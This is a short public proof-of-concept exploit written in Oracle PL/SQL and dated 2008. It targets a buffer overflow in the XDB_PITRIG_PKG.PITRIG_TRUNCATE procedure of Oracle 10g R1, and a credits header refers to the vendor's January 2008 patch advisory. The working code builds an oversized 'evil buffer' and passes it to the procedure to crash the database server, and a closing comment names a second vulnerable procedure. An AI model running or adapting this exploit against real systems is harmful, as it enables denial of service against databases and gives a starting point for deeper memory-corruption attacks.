/******************************************************************/
/******* Oracle 10g R1 xDb.XDB_PITRIG_PKG.PITRIG_TRUNCATE *********/
/*******                BUFFER OVERFLOW                   *********/
/******************************************************************/
/************    POC exploit , Crash database        **************/
/******************************************************************/
/******************  BY Sh2kerr (Digital Security)  ***************/
/******************************************************************/
/***************** tested on oracle 10.1.0.2.0  *******************/
/******************************************************************/
/******************************************************************/
/*         Date of Public EXPLOIT:  January 28, 2008              */
/*         Written by:              Alexandr "Sh2kerr" Polyakov   */
/*         email:                   Alexandr.Polyakov@dsec.ru     */
/*         site:                    http://www.dsec.ru            */
/******************************************************************/
/*  Original Advisory by:                                         */
/*      Alexandr Polyakov [ Alexandr.Polyakov@dsec.ru]            */
/*      Reported: 18  Dec 2007                                    */
/*      Date of Public Advisory: January 15, 2008                 */
/*      Advisory: http://www.oracle.com/technology/deploy/        */
/*                security/critical-patch-updates/cpujan2008.html */
/*                                                                */
/******************************************************************/
/*  thanks to oraclefun for his pitrig_dropmetadata exploit       */
/*                                                                */
/******************************************************************/


set serveroutput on
declare
     buff varchar2(32767);
     begin
      /* generate evil buffer */
      buff:='12345678901234567890123456789';
      buff:=buff||buff;
      buff:=buff||buff;
      buff:=buff||buff;
      buff:=buff||buff;
      buff:=buff||buff;
      buff:=buff||'0012345678901234567890123sh2kerr';
      /* lets see the buffer size */
      dbms_output.put_line('SEND EVIL BUFFER SIZE:'||Length(buff));
      xDb.XDB_PITRIG_PKG.PITRIG_TRUNCATE(buff,buff);
     end;
   /


/* P.S.      xDb.XDB_PITRIG_PKG.PITRIG_DROP is also vulnerable */


/******************************************************************/
/*************************** SEE U LATER  ;)  ***********************/
/******************************************************************/